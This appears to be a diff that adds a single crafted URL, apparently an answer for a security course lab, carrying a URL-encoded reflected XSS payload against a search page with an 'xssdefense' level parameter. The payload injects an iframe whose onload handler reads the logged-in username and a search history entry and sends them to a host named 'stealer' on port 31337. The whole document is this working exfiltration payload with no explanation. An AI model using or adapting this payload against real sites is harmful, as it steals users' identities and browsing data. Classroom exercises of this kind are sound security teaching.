@@ -1,0 +1,1 @@
+https://webproject.gtinfosec.org/search?xssdefense=2&q=%3Ciframe+onload%3D%22%24.get%28%60http%3A%2F%2Fstealer%3A31337%2F%3Fstolen_user%3D%60%2Bdocument.getElementById%28%60logged-in-user%60%29.innerHTML%2B%60%26last_search%3D%60%2Bdocument.getElementById%28%60history-list%60%29.children%5B1%5D.text%29%22%3E%3C%2Fiframe%3E
